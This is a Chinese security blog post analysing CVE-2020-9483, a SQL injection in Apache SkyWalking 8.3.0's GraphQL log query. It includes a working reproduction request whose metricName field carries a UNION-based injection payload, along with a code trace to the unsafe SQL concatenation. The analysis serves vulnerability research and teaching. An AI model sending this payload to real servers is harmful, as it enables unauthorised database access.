#  漏洞分析 | Apache SkyWalking SQL注入漏洞分析   
原创 杂七  杂七杂八聊安全   2024-12-30 03:36  
  
**朋友们，现在只对常读和星标的公众号才展示大图推送，建议大家把**  
**杂七杂八聊安全****“**  
**设为星标****”，**  
**否则可能就看不到了啦~**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciaq3n1ER1CYlGcBS8ialeu0eXURWVAyS8nbbPdrfqTibnSMUNGghAxBeWib2dLafwWibKdktxq8ek8IIEg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x01 熟悉Graphql**  
  
**0x01.1 Graphql环境搭建**  
  
通过springboot搭建graphql环境，pom  
.xml内容如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibLHFPLdlG4CaCkHS1jDd0ibYhZukTYe1PrnpYWdEE1NcBNstue4FpNIQ/640?wx_fmt=png&from=appmsg "")  
  
其中  
graphql-java-tools包是处理graphql请求，也就是提供graphql接口并处理相关请求，graphiql-spring-boot-starter提供web界面，访问h  
ttp://ip:port/ graphiql就能查看界面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibPhEIesUXtAdtjq8pcj7UIwujBGjyfz6yeRwLXPhCS9HJ1Mrf82hrDw/640?wx_fmt=png&from=appmsg "")  
  
Bean类：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibXMVeRzQHgQk5jORZFgPiaWK20cg2uwTwy2PYibibKqeqf9j6ectnTFyYA/640?wx_fmt=png&from=appmsg "")  
  
服务类：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibEU3fp5DgsRnUaoagQ5D4urroUDKuSQWafoncGkkPuP8RQCUu914CUw/640?wx_fmt=png&from=appmsg "")  
  
查询类：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibXGYzt3bvcKuF6cuxIzic4k53pTaziaLxibXZ9gSt1B6CibhxebsQOReSwA/640?wx_fmt=png&from=appmsg "")  
  
schema.graphqls，这里面的内容就是和bean类对应：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCib7RGWIgF7TcsmyFJQ2wNxDMIPHVO4iaU68VUIcqHYerCAKltexUneS9Q/640?wx_fmt=png&from=appmsg "")  
  
root.graphqls，这里面的内容就是和查询类相关联：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibtVCDIe07TKevh1RljaE8VpLUkicnJ1yMqbbz7fhiargBntYeUWHl7BKQ/640?wx_fmt=png&from=appmsg "")  
  
添加启动类启动就完成了graphql的搭建：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibo1ao3w2GPr0Uzs3O4ialVDjaPKxP6FJFDCT84Es0ibUo5hQyC5c4RHlQ/640?wx_fmt=png&from=appmsg "")  
  
启动后访问  
http://127.0.0.1/graphiq，就能和graphql进行交互操作：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibYIEy3p1icIw6nH1fxT9VibpkDjia2goKjRYTjTWrYy4xlvJYib6eBwYDmA/640?wx_fmt=png&from=appmsg "")  
  
Graphql之所以会出现就是因为能够根据你想要的内容按需返回，比如下面这种只需要返回id和name，就可以这样，不像RESTful  
 api只能返回全部，由前端选择返回的内容显示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibodQZMsNIgrVhBRSrPlIYxXz5pFPsrxR4wm6jYNDTPM6xapg7V3tIXg/640?wx_fmt=png&from=appmsg "")  
  
0x01.2 Graphql审计点  
  
审计graphql接口问题其实就是审计查询类相关的接口函数，最终的web请求到达的是继承于  
GraphQLQueryResolver的类，然后在这里有自定义的查询方法进入业务内容，本例中就是  
AuthorQuery下的  
findAuthorById方法，在该方法下打断点之后，在浏览器发包就会进入到该方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibm6vuncvIqqX1h46FWBTjxJbogmyFc8AiawGxjGFVv4OcMxOF7jibaXWQ/640?wx_fmt=png&from=appmsg "")  
  
0x02 CVE-2020-9483漏洞分析  
##### 0x02.1 环境搭建  
  
直接下载：  
```
https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-8.3.0.tar.gz
```  
  
然后解压进入bin目录执行startup.sh：  
  
  
访问http://127.0.0.1:8080/就能看到SkyWalking的界面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibZT2KAz9iatutUcEP8CNXjoYfpfMZlxcBmQpvvMvLklN9ExZvBaGwuNw/640?wx_fmt=png&from=appmsg "")  
  
如果需要远程调试则，在  
/bin/oapService.sh中的  
JAVA_OPTS里面添加调试参数后重启：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibPfcVzaicJ5ELXgnbEJp6SwZyXgTKjt61cQ49KniaYwMgCgq79MAa5EJw/640?wx_fmt=png&from=appmsg "")  
  
0x02.2 漏洞复现  
```
@font-face{
font-family:"Times New Roman";
}
@font-face{
font-family:"宋体";
}
@font-face{
font-family:"等线";
}
@font-face{
font-family:"Menlo";
}
p.MsoNormal{
mso-style-name:正文;
mso-style-parent:"";
margin:0pt;
margin-bottom:.0001pt;
mso-pagination:none;
text-align:justify;
text-justify:inter-ideograph;
font-family:等线;
mso-bidi-font-family:'Times New Roman';
font-size:10.5000pt;
mso-font-kerning:1.0000pt;
}
span.msoIns{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:underline;
text-underline:single;
color:blue;
}
span.msoDel{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:line-through;
color:red;
}
@page{mso-page-border-surround-header:no;
	mso-page-border-surround-footer:no;}@page Section0{
}
div.Section0{page:Section0;}
POST /graphql HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json;charset=utf-8
Content-Length: 313
Connection: close
 
{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"INFORMATION_SCHEMA.USERS union all select h2version())a where 1=? or 1=? or 1=? --",
                    "endpointId":"1",
                    "traceId":"1",
                    "state":"ALL",
                    "stateCode":"1",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibia9bXaLgwomA92dRpw35iang7Hibp9sA7ewAVesTNva3lEmEJxeFC9JTA/640?wx_fmt=png&from=appmsg "")  
  
0x02.3 漏洞分析  
  
这个请求所对应graphql  
s文件是  
query-graphql-plugin-8.3.0.jar 包中的l  
og.graphqls文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibe12n2Jia3uIzfBcAVlXMGfUicvd4TXq0hZwY447EPdEVMZ57qSDibd4qQ/640?wx_fmt=png&from=appmsg "")  
  
与这个对应的接口方法在  
query-graphql-plugin-8.3.0.jar中的  
org.apache.skywalking.oap.query.graphql.resolver.LogQuery方法中：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibTvg7kN31wpiayT71VPLv9ndBWib0ruVPE8gvNX3mlpEpZc73jdxzGUPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibpCPicdq55geyGqhz2ctLBVR2WLhdkJzh3cUtUydtbyqttA1E1LcOS9w/640?wx_fmt=png&from=appmsg "")  
  
在  
queryLogs方法上下断点，发包就会进入该方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibX27LuF92e4M3uc8wSqKhstw4icECF4eKfsk5LG7IbD8GUL6IhsMvic0A/640?wx_fmt=png&from=appmsg "")  
  
接下来会进入到  
```
org.apache.skywalking.oap.server.core.query.LogQueryService#queryLogs
```  
  
里面，这里会调用Dao层方法，也就是数据库方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibVB8zIXjospVdq5jlYewj0R5T5ibTDZSAZpXPUibibGepFOb3fbOzZMjyg/640?wx_fmt=png&from=appmsg "")  
  
这里的dao层方法是执行H  
2db的SQL语句的方法：  
```
org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao.H2LogQueryDAO#queryLogs
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibjic58cCAuFxe1e7wvGzkncicDk7xD1DYicn4RNwByUyhzqBTdcIpMFW1w/640?wx_fmt=png&from=appmsg "")  
  
在  
H2LogQueryDAO中直接将  
metricName拼接到SQL语句中就造成了SQL注入漏洞：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCib2B42OPQ2uGwiaYdiabPDnnibByIrn56QZtRbHlMcJic09g8Zkl6nszgIQA/640?wx_fmt=png&from=appmsg "")  
  
到达执行SQL语句的地方：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCibgWrHplxT9ymyQQ2Rbrf0hVLfx7Cff31l9uicCl1SpVJqR06E9BmbpNg/640?wx_fmt=png&from=appmsg "")  
  
接下来就会执行输入的SQL语句达到SQL注入的效果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5icW96HKeciarvtV9O68M8GQz3ibIvJXSCib2jBSzh8EWpJhYRO9KZB9AzJYba34FAvAGbZuSyuohtibficZN8IsSJfg/640?wx_fmt=png&from=appmsg "")  
  
END  
  
  
  
  
往期经典回顾  
  
  
  
[JS断点调试教学](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484445&idx=1&sn=78da18444b38922f842c57f0046e64c8&chksm=c07b405ff70cc9497576d4b86ae2264f4280d3f13610028ae26a4ecf245ef45375c4de61f981&scene=21#wechat_redirect)  
  
  
[搜索框之%的妙用](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485114&idx=1&sn=7ea2f21ec5c61cd5af8f4f2a272b11f9&chksm=c07b42f8f70ccbeebf1a599203bc5b87e8216acb39f94ab11ead9ab54184791510d1c6d1e245&scene=21#wechat_redirect)  
  
  
[子域接管漏洞讲解](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485141&idx=1&sn=56fc9882f11d11ae475a6957c75d4dc2&chksm=c07b4297f70ccb81210552f43294630210381c03b8434abb10c8f7c3d91c82ef1d03bba4ebd5&scene=21#wechat_redirect)  
  
  
[HTTP头部注入漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484888&idx=1&sn=6f13af6bdccc6083418ea37c8f3fb3f4&chksm=c07b419af70cc88c432e687979ac95ac9061c545a2221ec2f22d4574618dc7ac8c0a419f6fa0&scene=21#wechat_redirect)  
  
  
[Tomcat路径解析特性](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485429&idx=1&sn=bfefe19d9f46000c1d1ccc327748f06b&chksm=c07b43b7f70ccaa14338b331cc154a032636ad568d98ee4bac21bb4910286017b2d9684d4d4e&scene=21#wechat_redirect)  
  
  
[xxl-job的命令执行详解](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485612&idx=1&sn=10a7a551a984222502d1eb5fdb954841&chksm=c07b4ceef70cc5f8208380d5dd810243336f95f624a583fb19f44d06a38b4105a1f07f272b9b&scene=21#wechat_redirect)  
  
  
[Tomcat配置造成的漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485752&idx=1&sn=749119f5b2a84d34514bdba679e0375d&chksm=c07b4d7af70cc46c917160f795a76541a798018ca628866f17ac55c8bfa764f8ea8254537394&scene=21#wechat_redirect)  
  
  
[对某授权学校的常规渗透](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483787&idx=1&sn=d8d511ab73c62fecbca898f4c41e546c&chksm=c07b45c9f70cccdfdae606543a576984c7cf43ebaf8422df8e3fd586655b882e29fe60a8bccd&scene=21#wechat_redirect)  
  
  
[契约锁命令执行漏洞分析](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485579&idx=1&sn=26e436700e7b0b57fb22183295bf9cce&chksm=c07b4cc9f70cc5dfea2b74824342503e342c017483bf207a1c50bc8ae172ceaafb33da221b04&scene=21#wechat_redirect)  
  
  
[FindAll最强应急响应工具](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485623&idx=1&sn=13ea59a52ec20495a1d96d48fe8f0959&chksm=c07b4cf5f70cc5e3a382fc04453cde68287a767c56e248d4d09c94f952d3e136989ee749353b&scene=21#wechat_redirect)  
  
  
[Tomcat Put文件上传漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485694&idx=1&sn=e2edc91825ab2f5afe09fed5902e167f&chksm=c07b4cbcf70cc5aabbcc9b5b0e2c3b02e13d4711021237c43270d24496de230dc7a53dd41830&scene=21#wechat_redirect)  
  
  
[一次另类的mssql渗透之路](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485090&idx=1&sn=aaee13ec3f68afd30b64c60fb74de8b8&chksm=c07b42e0f70ccbf68c4931c370e336637a7a6e13a9a42cefd97d07409384586d0b234c813a88&scene=21#wechat_redirect)  
  
  
[DirtyPipe-脏管道内核提权](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485165&idx=1&sn=81c53eac841e98823bf577dca8abcf8a&chksm=c07b42aff70ccbb965d66235a8c489488ce947f3eff2f8463f9a93bf6cdec326ec963b9cc57d&scene=21#wechat_redirect)  
  
  
[web站点登录框的常规突破](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484696&idx=1&sn=ef36957bd0e4b00cf5e341a7a74d06a3&chksm=c07b415af70cc84c5e30113fd4e7edf350401725856ef37345c955bf73f2f4e62dd74c71cc8c&scene=21#wechat_redirect)  
  
  
[openfire权限绕过漏洞分析](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485552&idx=1&sn=1ff02ce3590679f0e5d62bd733bd4e22&chksm=c07b4c32f70cc524cebf245d2c840be3db421c86031cd62beb5b0d93ab6b321bcadfb1614f97&scene=21#wechat_redirect)  
  
  
[若依4.7.6任意文件下载分析](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485532&idx=1&sn=56233fce8d84a53c48bdcdcfe0a4cda6&chksm=c07b4c1ef70cc5086262f44c3f68798d8ba393935a0d24624a77210c103ef94b1b21596dcae2&scene=21#wechat_redirect)  
  
  
[ 一次没有逗号的MSSQL注入](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485185&idx=1&sn=895ee6b7610b6f32be7086b527666cc1&chksm=c07b4343f70cca55a24236018deda9cfad47cc9ad950b79c488d4fc3d2460e341fd24a8f7157&scene=21#wechat_redirect)  
  
  
[host碰撞之边界突破getshell](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483859&idx=1&sn=905977c98c278ce23058b4b2c2cec951&chksm=c07b4591f70ccc8786c41af1b2bed0f777aaa57fe7407b4d9615eebbbb3c86579e2f987b5fc8&scene=21#wechat_redirect)  
  
  
[另类的SSRF漏洞的挖掘与利用](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484749&idx=1&sn=b6e183851754e7dfbfe4c2cc829cfa63&chksm=c07b410ff70cc819841b0694e143543d9dc0e4c9ab1b186c53e0ee307898a74008e2fb11ddad&scene=21#wechat_redirect)  
  
  
[另类的XSS攻击之新型XSS载体](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484841&idx=1&sn=b26dabac5e770bbd7b1331fda1a55fbd&chksm=c07b41ebf70cc8fda9501464c3401eb9920424354f1d47a15c4ca06f45876fcc76727296129d&scene=21#wechat_redirect)  
  
  
[Nacos历史+最新漏洞详细分析](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485330&idx=1&sn=cdd36a0fb30ea1eaacb87b255a170490&chksm=c07b43d0f70ccac62ed995018b17f06e70cdbe1ea351c82f3906179d4dc3f657ef512598543a&scene=21#wechat_redirect)  
  
  
[新型目录碰撞工具DirCollision](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483860&idx=1&sn=feeeb8a332cbd808378b529c7a4461cb&chksm=c07b4596f70ccc80f5b1a477e43c2068745c9c2add75e7864b213db59b878f6e7b1dd33fd20f&scene=21#wechat_redirect)  
  
  
[Windows文件/文件夹隐藏技巧](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485035&idx=1&sn=b0a75ee79d31949d7d1665e846fb35c9&chksm=c07b4229f70ccb3f5c5828bebf8152dde198481c413c5dc7a8a98a88406ae45e92d12a2aaaf0&scene=21#wechat_redirect)  
  
  
[xray windows 1.9x版通杀补丁](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483680&idx=1&sn=533ec7a01f23b787140c4ed5d8b3d096&chksm=c07b4562f70ccc74dd692b604e7913a5d403e9e4dee2e7836e101b9023d1c36c959e21f506a2&scene=21#wechat_redirect)  
  
  
[FindAll史诗级最强应急响应工具](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485623&idx=1&sn=13ea59a52ec20495a1d96d48fe8f0959&chksm=c07b4cf5f70cc5e3a382fc04453cde68287a767c56e248d4d09c94f952d3e136989ee749353b&scene=21#wechat_redirect)  
  
  
[初学者的mimikatz免杀制作教程](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484585&idx=1&sn=7551abe6ec57ec41615b6f3d5bdbbed3&chksm=c07b40ebf70cc9fd79a0f0c23c682d5c4f9fd9dae638584ff75fd61d9867b4b212101cd14c73&scene=21#wechat_redirect)  
  
  
[低版本Tomcat如何另类getshell](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485335&idx=1&sn=a4d7fc70e711f09bac74fd5b9ade51d9&chksm=c07b43d5f70ccac36cf6839224f5db44e631590d5dd871d78bc60b6acaf17fd88d86deaadfee&scene=21#wechat_redirect)  
  
  
[Nginx配置不当导致内网资产暴漏](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485336&idx=1&sn=84ee64c58a1838dc2a43b0e69c84f205&chksm=c07b43daf70ccacce30f6f8e3e18c545be747f93e07678275bc6672178fde6b3eaea4bc26ed9&scene=21#wechat_redirect)  
  
  
[web登录框密码加密的突破小秘密](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247484638&idx=1&sn=432a65116ced1190672f7691f14c4d87&chksm=c07b409cf70cc98aacdfc49dae64bb1b5768a2346b915f7b4e75e1dcdb32d1b0d56066641180&scene=21#wechat_redirect)  
  
  
[Windows快捷方式权限维持与后门](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485200&idx=1&sn=f8b01f78def1a3504833965f2283fcd2&chksm=c07b4352f70cca4435c25e2f1423e0c6c3589f5cd2fc5883ad25cb9b4da7e584e4bd45930f4f&scene=21#wechat_redirect)  
  
  
[Tomcat的JMX服务引发的安全漏洞](https://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485941&idx=1&sn=3e590b01d812c573840f7bb003cf5cb4&scene=21#wechat_redirect)  
  
  
[金蝶Apusic未授权目录遍历漏洞分析](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485332&idx=1&sn=3df57185e16d407353fa86c3115ac552&chksm=c07b43d6f70ccac0913e6744d62692c846cbefc9519a7d72582513f39a25e4e753de6d6af56c&scene=21#wechat_redirect)  
  
  
[Nacos JRaft 任意文件读写利用工具](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485765&idx=1&sn=17dc0de84f6d5c29d2a89ff42066e8c3&chksm=c07b4d07f70cc411863ef0b67dcd06ad1e3965bc5828f219484eb37aa7ae49c8f834bc1bb2ad&scene=21#wechat_redirect)  
  
  
[Apache ActiveMQ RCE漏洞利用工具](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485563&idx=1&sn=75874d75de1b5d9608b6fbd55fd6f6a5&chksm=c07b4c39f70cc52ff39f6db8ae55b27d8d9031bf2793115efa62e8e5d3fc0ab5e1c4d0ca4806&scene=21#wechat_redirect)  
  
  
[ServerStatusDiffInterceptor反序列化](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485489&idx=1&sn=a9b71d996767453382e776f4c511504d&chksm=c07b4c73f70cc565bbf1f99b1798f3468fee08d314af4daa10a802d7d168f650f92a6842b58d&scene=21#wechat_redirect)  
  
  
[Linux本地sudo(CVE-2021-3156)提权](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485201&idx=1&sn=8144629d1685f4d6519b8a7bacdbd4b9&chksm=c07b4353f70cca45f13ea4a03a0636738904c4f57139767a4df016ae20f6f4ed975e8ef6feac&scene=21#wechat_redirect)  
  
  
[spring-security 三种情况下的认证绕过](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485128&idx=1&sn=00ec04aefba51abcc5ff787499079722&chksm=c07b428af70ccb9c8375268d00d5fa307ce10943f050bb501566937f0398a1bbbcbc207510c8&scene=21#wechat_redirect)  
  
  
[密码测评相关概念及国标和行标文档分享](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483976&idx=1&sn=f50c2b4183bf61c6b4298a28ecc6e8d7&chksm=c07b460af70ccf1cb82b212b1c25c4dcc50ed384141e3b3b46034440b15739b1caad77d7b28e&scene=21#wechat_redirect)  
  
  
[中华人民共和国金融行标文档分享及介绍](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483899&idx=1&sn=fcb0a682eae04d147184366bd4399075&chksm=c07b45b9f70cccaf20b5c3f97e9e269e30152e11179840645429e937681ecebf2944924bb52a&scene=21#wechat_redirect)  
  
  
[中华人民共和国工控国标文档分享及介绍](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247483928&idx=1&sn=fefea2c81a9c1c28cdd66e6b5db66788&chksm=c07b465af70ccf4ceba6a7d8f3eacdcd488949de4e1097cba862eb1963af330f7b854442b5d4&scene=21#wechat_redirect)  
  
  
[xxl-job前台api未授权Hessian2反序列化](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485659&idx=1&sn=a3cd5ba335f847a1174c0b6621d179a3&chksm=c07b4c99f70cc58fdd0e6316c70f794c7d63f2519b5835d1b49ed2bd571f68208b7180b6cf30&scene=21#wechat_redirect)  
  
  
[fastjson反序列化漏洞初探之parseObject](http://mp.weixin.qq.com/s?__biz=Mzg5Njg5ODM0OQ==&mid=2247485396&idx=1&sn=79ae76c29e620e4dfd64629699e53485&chksm=c07b4396f70cca80d157f6adfd1253c6282bc00e9421a3b6848e778662085ad60667cb2fe0c1&scene=21#wechat_redirect)  
  
<table><tbody><tr><td data-colwidth="558" width="558" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph=""><span style="color: rgb(255, 76, 0);"><strong><span leaf="">免责声明：</span></strong></span><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！！</span></h1></td></tr></tbody></table>  
  
点赞  
是鼓励   
在看  
是认同   
分享  
是  
传递知识  
  
**看完点个**  
**“在看”**  
**分享给更多人**  
  
  
